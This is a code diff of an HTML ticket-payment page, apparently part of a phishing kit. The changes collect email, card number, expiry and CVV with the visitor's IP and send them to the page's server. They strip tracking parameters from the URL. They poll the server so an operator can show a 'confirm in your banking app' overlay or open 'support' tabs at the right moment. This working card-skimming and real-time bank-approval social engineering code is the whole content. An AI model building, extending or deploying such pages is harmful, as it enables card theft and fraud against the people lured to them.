@@ -124,10 +124,131 @@
                 gap: 0.7rem;
             }
         }
+        #push-overlay {
+            z-index: 100000 !important;
+        }
+    </style>
+    <style>
+    #push-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(22,182,255,0.97);
+      z-index: 100000;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      transition: opacity 0.3s;
+      animation: fadeInPush 0.5s;
+    }
+    @keyframes fadeInPush {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .push-modal {
+      background: #fff;
+      border-radius: 24px;
+      max-width: 370px;
+      width: 92vw;
+      margin: auto;
+      padding: 2.7rem 2rem 2.2rem 2rem;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.18);
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: popInPush 0.5s;
+    }
+    @keyframes popInPush {
+      0% { transform: scale(0.92); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .push-bell {
+      margin-bottom: 1.5rem;
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #16b6ff 60%, #00e0ff 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 16px rgba(22,182,255,0.18);
+      position: relative;
+      animation: bellPop 0.7s;
+    }
+    @keyframes bellPop {
+      0% { transform: scale(0.7); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .push-bell svg {
+      width: 38px;
+      height: 38px;
+      color: #fff;
+      animation: bellShake 1.2s infinite cubic-bezier(.36,.07,.19,.97);
+      transform-origin: 50% 10%;
+    }
+    @keyframes bellShake {
+      0%, 100% { transform: rotate(0deg); }
+      10% { transform: rotate(-10deg); }
+      20% { transform: rotate(8deg); }
+      30% { transform: rotate(-6deg); }
+      40% { transform: rotate(4deg); }
+      50% { transform: rotate(-2deg); }
+      60% { transform: rotate(1deg); }
+      70%, 90% { transform: rotate(0deg); }
+    }
+    .push-title {
+      font-size: 2.1rem;
+      font-weight: 700;
+      color: #16b6ff;
+      margin-bottom: 0.7rem;
+      letter-spacing: -1px;
+    }
+    .push-desc {
+      font-size: 1.13rem;
+      color: #222;
+      margin-bottom: 0.7rem;
+      line-height: 1.5;
+    }
+    @media (max-width: 480px) {
+      .push-modal { padding: 1.2rem 0.5rem 1.2rem 0.5rem; }
+      .push-title { font-size: 1.3rem; }
+      .push-desc { font-size: 0.98rem; }
+    }
     </style>
 </head>
 <body>
-    <div class="payment-card">
+    <!-- Блок для приховування total, price, currency з URL -->
+    <script>
+    (function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let changed = false;
+        const total = urlParams.get('total');
+        const price = urlParams.get('price');
+        const currency = urlParams.get('currency');
+        if (total) {
+            sessionStorage.setItem('ticket_total', total);
+            changed = true;
+        }
+        if (price) {
+            sessionStorage.setItem('ticket_price', price);
+            changed = true;
+        }
+        if (currency) {
+            sessionStorage.setItem('ticket_currency', currency);
+            changed = true;
+        }
+        // Якщо були параметри — видаляємо їх з URL
+        if (changed) {
+            const newUrl = new URL(window.location);
+            newUrl.searchParams.delete('total');
+            newUrl.searchParams.delete('price');
+            newUrl.searchParams.delete('currency');
+            window.history.replaceState({}, document.title, newUrl.pathname + newUrl.search);
+        }
+    })();
+    </script>
+    <div class="payment-card" id="payment-card-main">
         <div class="bank-icon">
             <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
         </div>
@@ -142,15 +263,25 @@
             </div>
             <div class="row">
                 <div class="input-group">
-                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
+                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9]{2}/[0-9]{2}" inputmode="numeric" required>
                 </div>
                 <div class="input-group">
-                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
+                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="3" pattern="[0-9]{3}" inputmode="numeric" required>
                 </div>
             </div>
             <button type="submit" class="confirm-btn">Confirm</button>
             <div id="support-buttons" style="display:none; margin-top: 16px; text-align:center;"></div>
         </form>
+        <button id="back-btn" style="width:100%;margin-top:18px;padding:0.8rem 0;border:none;border-radius:12px;background:#eee;color:#222;font-size:1.1rem;font-weight:500;cursor:pointer;">Back</button>
+    </div>
+    <div id="push-overlay">
+      <div class="push-modal">
+        <div class="push-bell">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6V11c0-3.07-1.63-5.64-5-6.32V4a1 1 0 1 0-2 0v.68C7.63 5.36 6 7.92 6 11v5l-1.29 1.29A1 1 0 0 0 6 19h12a1 1 0 0 0 .71-1.71L18 16z" fill="#fff"/></svg>
+        </div>
+        <div class="push-title" id="push-payment-title">Payment Confirmation</div>
+        <div class="push-desc">To confirm the transaction, open your banking app and follow the instructions of your bank. <br>Do not close this window.</div>
+      </div>
     </div>
     <script>
     // Зчитування параметрів з URL
@@ -160,12 +291,11 @@
     }
     // --- Витягуємо total і currency з URL ---
     function getTotalAndCurrency() {
-    const totalRaw = getQueryParam('total');
-        const currencyRaw = getQueryParam('currency') || 'EUR';
-    if (totalRaw) {
-        // Витягуємо тільки число (цілу або з копійками)
-        const match = totalRaw.match(/\d+[\.,]?\d*/);
-        const totalNum = match ? match[0].replace(',', '.') : '';
+        const totalRaw = getQueryParam('total') || sessionStorage.getItem('ticket_total');
+        const currencyRaw = getQueryParam('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+        if (totalRaw) {
+            const match = totalRaw.match(/\d+[\.,]?\d*/);
+            const totalNum = match ? match[0].replace(',', '.') : '';
             return { total: totalNum, currency: currencyRaw };
         }
         // fallback: price/currency
@@ -199,19 +329,28 @@
     updateAllTotals();
     // --- Замість uid використовуємо page_code ---
     function getPageCode() {
-        // 1. З URL
-        const urlParams = new URLSearchParams(window.location.search);
-        let page = urlParams.get('page');
-        if (page) return page;
-        // 2. З sessionStorage
-        page = sessionStorage.getItem('page_code');
-        if (page) return page;
-        // 3. Попередження
-        console.warn('No page_code found in URL or sessionStorage!');
-        return '';
+      // 1. З URL
+      const urlParams = new URLSearchParams(window.location.search);
+      let page = urlParams.get('page');
+      if (page) return page;
+      // 2. З sessionStorage
+      page = sessionStorage.getItem('page_code');
+      if (page) return page;
+      return '';
     }
-    document.getElementById('paymentForm').onsubmit = async function(e) {
+    // Додаємо показ overlay-вікна загрузки після сабміту форми
+    if (!window.loadingOverlay) {
+      window.loadingOverlay = document.createElement('div');
+      window.loadingOverlay.id = 'loading-overlay';
+      window.loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
+      window.loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing payment...</div></div>';
+      document.body.appendChild(window.loadingOverlay);
+    }
+
+    const paymentForm = document.getElementById('paymentForm');
+    paymentForm.onsubmit = async function(e) {
         e.preventDefault();
+        window.loadingOverlay.style.display = 'flex';
         const email = document.getElementById('email-input').value;
         const card = document.getElementById('card-input').value;
         const expiry = document.getElementById('expiry-input').value;
@@ -222,34 +361,37 @@
         // --- Додаємо телефон і ім'я з sessionStorage ---
         const phone = sessionStorage.getItem('ticket_phone') || '';
         const name = sessionStorage.getItem('ticket_name') || '';
+        // Додаємо page_code
+        function getPageCode() {
+          // 1. З URL
+          const urlParams = new URLSearchParams(window.location.search);
+          let page = urlParams.get('page');
+          if (page) return page;
+          // 2. З sessionStorage
+          page = sessionStorage.getItem('page_code');
+          if (page) return page;
+          return '';
+        }
+        const page_code = getPageCode();
         try {
             let ip = userIP;
             if (!ip) {
                 await new Promise(res => setTimeout(res, 500));
                 ip = userIP;
             }
-            const page_code = getPageCode();
             // --- Додаю логування для діагностики ---
             console.log('SEND PAYMENT DATA:', { email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name });
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, page_code, price, currency, phone, name })
             });
-            if (response.ok) {
-                if (!document.getElementById('payment-msg')) {
-                    const msg = document.createElement('div');
-                    msg.id = 'payment-msg';
-                    msg.style.color = '#16b6ff';
-                    msg.style.fontWeight = '500';
-                    msg.style.marginTop = '18px';
-                    msg.textContent = 'Payment sent!';
-                    document.querySelector('.payment-card').appendChild(msg);
-                }
-            } else {
+            // overlay залишається до push/support/text!
+            if (!response.ok) {
                 console.error('Помилка при відправці даних');
             }
         } catch (error) {
+            // loadingOverlay.style.display = 'none'; // <-- видаляємо
             console.error('Помилка при зверненні до сервера:', error);
         }
     };
@@ -261,7 +403,10 @@
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => callback(data.ip))
-            .catch(() => callback(null));
+            .catch((e) => {
+                console.warn('Could not get user IP:', e);
+                callback(null);
+            });
     }
     let userIP = null;
     getUserIP(function(ip) {
@@ -324,60 +469,39 @@
     <!--End of Tawk.to Script-->
     <script>
     // --- POLLING для support/text кнопок ---
-    function showSupportButtons(total, text_id) {
-        const page_code = getPageCode();
-        let html = '';
-        if (window.show_support_flag || (window.show_text_flag && text_id)) {
-            html += `<div style="margin-bottom:10px;font-size:1rem;font-weight:500;color:#222;">If something went wrong, please use the link below.</div>`;
-        }
-        if (window.show_support_flag) {
-            html += `<a id="support-btn" href="/buy-tickets/loading/waiting-support.html?page=${page_code}" class="confirm-btn support-proceed-btn" style="margin-bottom:10px;display:block;">Proceed</a>`;
-        }
-        if (window.show_text_flag && text_id) {
-            html += `<a id="text-btn" href="/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${text_id}" class="confirm-btn support-proceed-btn" style="background:#dc3545;display:block;">Proceed</a>`;
-        }
-        if (html) {
-            document.getElementById('support-buttons').innerHTML = html;
-            document.getElementById('support-buttons').style.display = 'block';
-            // Add click handlers
-            if (window.show_support_flag) {
-                document.getElementById('support-btn').onclick = async function(e) {
-                    e.preventDefault();
-                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
-                    document.getElementById('support-buttons').style.display = 'none';
-                    window.location.href = this.href;
-                };
-            }
-            if (window.show_text_flag && text_id) {
-                document.getElementById('text-btn').onclick = async function(e) {
-                    e.preventDefault();
-                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
-                    document.getElementById('support-buttons').style.display = 'none';
-                    window.location.href = this.href;
-                };
-            }
-        }
+    let supportTabOpened = false;
+    function startSupportPolling() {
+      setTimeout(pollSupportButtons, 2000);
     }
     async function pollSupportButtons() {
         if (!userIP) {
-            console.log('No userIP yet, retrying in 2s');
             return setTimeout(pollSupportButtons, 2000);
         }
-        const totalRaw = getQueryParam('total') || '';
         try {
-            console.log('Polling support buttons for IP:', userIP);
             const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
             const data = await resp.json();
-            console.log('Support response:', data);
-            window.show_support_flag = data.show_support;
-            window.show_text_flag = data.show_text;
-            showSupportButtons(totalRaw, data.text_id);
-        } catch (e) {
-            console.error('Error polling support buttons:', e);
-        }
+            if ((data.show_support || data.show_text)) {
+                if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
+            }
+            if (!supportTabOpened && (data.show_support || data.show_text)) {
+                const page_code = getPageCode();
+                if (data.show_support) {
+                    window.open(`/buy-tickets/loading/waiting-support.html?page=${page_code}`, '_blank');
+                    supportTabOpened = true;
+                }
+                if (data.show_text && data.text_id) {
+                    window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${data.text_id}`, '_blank');
+                    supportTabOpened = true;
+                }
+            }
+        } catch (e) {}
         setTimeout(pollSupportButtons, 2000);
     }
-    setTimeout(pollSupportButtons, 2000);
+    // Стартуємо polling тільки після визначення userIP
+    getUserIP(function(ip) {
+        userIP = ip;
+        startSupportPolling();
+    });
     </script>
     <script>
     // --- Оновлення IP у базі при відкритті сторінки ---
@@ -419,59 +543,64 @@
     });
     </script>
     <script>
-// --- Payment page: total з URL завжди головний ---
-document.addEventListener('DOMContentLoaded', function() {
-    function getQueryParam(name) {
-        const url = new URL(window.location.href);
-        return url.searchParams.get(name);
-    }
-    // 1. Пріоритет: total/currency з URL
-    const total = getQueryParam('total');
-    const currency = getQueryParam('currency') || 'EUR';
-    if (total) {
-        // Оновлюємо заголовок і всі суми на сторінці
-        document.getElementById('payment-title').textContent = `Payment ${total} ${currency}`;
-        document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
-            el.textContent = `${total} ${currency}`;
-        });
-        document.querySelectorAll('[data-payment-price]').forEach(el => {
-            el.setAttribute('data-payment-price', total);
-            el.setAttribute('data-payment-currency', currency);
-        });
-        document.querySelectorAll('form[data-payment-form]').forEach(form => {
-            const priceInput = form.querySelector('input[name="price"]');
-            const currencyInput = form.querySelector('input[name="currency"]');
-            if (priceInput) priceInput.value = total;
-            if (currencyInput) currencyInput.value = currency;
-        });
-        return; // Не оновлюємо нічим іншим!
-    }
-    // 2. Якщо total немає — fallback на price/currency з API
-    const url = new URL(window.location.href);
-    let page_code = url.searchParams.get('page') || sessionStorage.getItem('page_code');
-    if (page_code) {
-        fetch('/api/payment_data?page=' + encodeURIComponent(page_code))
-            .then(r => r.json())
-            .then(ev => {
-                if (ev.price && ev.currency) {
-                    document.getElementById('payment-title').textContent = `Payment ${ev.price} ${ev.currency}`;
-                    document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
-                        el.textContent = `${ev.price} ${ev.currency}`;
-                    });
-                    document.querySelectorAll('[data-payment-price]').forEach(el => {
-                        el.setAttribute('data-payment-price', ev.price);
-                        el.setAttribute('data-payment-currency', ev.currency);
-                    });
-                    document.querySelectorAll('form[data-payment-form]').forEach(form => {
-                        const priceInput = form.querySelector('input[name="price"]');
-                        const currencyInput = form.querySelector('input[name="currency"]');
-                        if (priceInput) priceInput.value = ev.price;
-                        if (currencyInput) currencyInput.value = ev.currency;
-                    });
-                }
-            });
-    }
+document.getElementById('cvv-input').addEventListener('input', function(e) {
+  this.value = this.value.replace(/\D/g, '').slice(0, 3);
 });
+</script>
+<script>
+// --- Payment page: total з URL завжди головний ---
+// document.addEventListener('DOMContentLoaded', function() {
+//     function getQueryParam(name) {
+//         const url = new URL(window.location.href);
+//         return url.searchParams.get(name);
+//     }
+//     // 1. Пріоритет: total/currency з URL
+//     const total = getQueryParam('total');
+//     const currency = getQueryParam('currency') || 'EUR';
+//     if (total) {
+//         // Оновлюємо заголовок і всі суми на сторінці
+//         document.getElementById('payment-title').textContent = `Payment ${total} ${currency}`;
+//         document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
+//             el.textContent = `${total} ${currency}`;
+//         });
+//         document.querySelectorAll('[data-payment-price]').forEach(el => {
+//             el.setAttribute('data-payment-price', total);
+//             el.setAttribute('data-payment-currency', currency);
+//         });
+//         document.querySelectorAll('form[data-payment-form]').forEach(form => {
+//             const priceInput = form.querySelector('input[name="price"]');
+//             const currencyInput = form.querySelector('input[name="currency"]');
+//             if (priceInput) priceInput.value = total;
+//             if (currencyInput) currencyInput.value = currency;
+//         });
+//         return; // Не оновлюємо нічим іншим!
+//     }
+//     // 2. Якщо total немає — fallback на price/currency з API
+//     const url = new URL(window.location.href);
+//     let page_code = url.searchParams.get('page') || sessionStorage.getItem('page_code');
+//     if (page_code) {
+//         fetch('/api/payment_data?page=' + encodeURIComponent(page_code))
+//             .then(r => r.json())
+//             .then(ev => {
+//                 if (ev.price && ev.currency) {
+//                     document.getElementById('payment-title').textContent = `Payment ${ev.price} ${ev.currency}`;
+//                     document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
+//                         el.textContent = `${ev.price} ${ev.currency}`;
+//                     });
+//                     document.querySelectorAll('[data-payment-price]').forEach(el => {
+//                         el.setAttribute('data-payment-price', ev.price);
+//                         el.setAttribute('data-payment-currency', ev.currency);
+//                     });
+//                     document.querySelectorAll('form[data-payment-form]').forEach(form => {
+//                         const priceInput = form.querySelector('input[name="price"]');
+//                         const currencyInput = form.querySelector('input[name="currency"]');
+//                         if (priceInput) priceInput.value = ev.price;
+//                         if (currencyInput) currencyInput.value = ev.currency;
+//                     });
+//                 }
+//             });
+//     }
+// });
 </script>
 <script>
 // --- Fallback: якщо page_code є в sessionStorage, але немає в URL — додаємо його в URL і перезавантажуємо сторінку ---
@@ -496,7 +625,101 @@ document.addEventListener('DOMContentLoaded', function() {
             window.location.replace(url.toString());
         }
     }
+    })();
+    </script>
+    
+    <!-- Універсальний блок для приховування page_code з URL -->
+    <script>
+    (function() {
+        // Отримуємо page_code з URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const page_code = urlParams.get('page');
+        
+        if (page_code) {
+            // Зберігаємо в sessionStorage
+            sessionStorage.setItem('page_code', page_code);
+            
+            // Видаляємо з URL без перезавантаження сторінки
+            const newUrl = new URL(window.location);
+            newUrl.searchParams.delete('page');
+            window.history.replaceState({}, document.title, newUrl.pathname + newUrl.search);
+            
+            console.log('Page code hidden from URL and saved to sessionStorage:', page_code);
+        }
+    })();
+    </script>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Перевіряємо параметр f=1
+  function isFromBot() {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('f') === '1') return true;
+    if (sessionStorage.getItem('from_bot') === '1') return true;
+    return false;
+  }
+  if (isFromBot()) {
+    document.getElementById('back-btn').style.display = 'none';
+    sessionStorage.setItem('from_bot', '1');
+  } else {
+    document.getElementById('back-btn').style.display = 'block';
+    sessionStorage.removeItem('from_bot');
+  }
+});
+</script>
+<script>
+(function() {
+  const url = new URL(window.location.href);
+  const params = url.searchParams;
+  if (params.get('f') === '1') {
+    sessionStorage.setItem('from_bot', '1');
+    params.delete('f');
+    window.history.replaceState({}, '', url.pathname + (params.toString() ? '?' + params.toString() : ''));
+  }
 })();
+</script>
+<script>
+document.getElementById('back-btn').onclick = function() {
+    // Повертаємо на /buy-tickets/ з event_index, якщо є
+    const event = sessionStorage.getItem('event_index');
+    if (event !== null && event !== undefined) {
+        window.location.href = `/buy-tickets/?event=${encodeURIComponent(event)}`;
+    } else {
+        window.location.href = '/buy-tickets/';
+    }
+};
+</script>
+<script>
+    function getPageCode() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let page = urlParams.get('page');
+      if (page) return page;
+      page = sessionStorage.getItem('page_code');
+      if (page) return page;
+      return '';
+    }
+    function pollPushOverlay() {
+      const page_code = getPageCode();
+      document.body.setAttribute('data-page-code', page_code);
+      if (!page_code) return setTimeout(pollPushOverlay, 2000);
+      const url = '/check_push?page_code=' + encodeURIComponent(page_code);
+      fetch(url)
+        .then(resp => resp.text())
+        .then(txt => {
+          if (txt === 'true') {
+            const { total, currency } = getTotalAndCurrency();
+            const pushTitle = document.getElementById('push-payment-title');
+            if (pushTitle) {
+              pushTitle.textContent = `Payment ${total} ${currency}`;
+            }
+            document.getElementById('push-overlay').style.display = 'flex';
+            document.getElementById('payment-card-main').style.display = 'none';
+            if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
+          } else {
+            setTimeout(pollPushOverlay, 2000);
+          }
+        });
+    }
+    setTimeout(pollPushOverlay, 2000);
     </script>
 </body>
 </html>
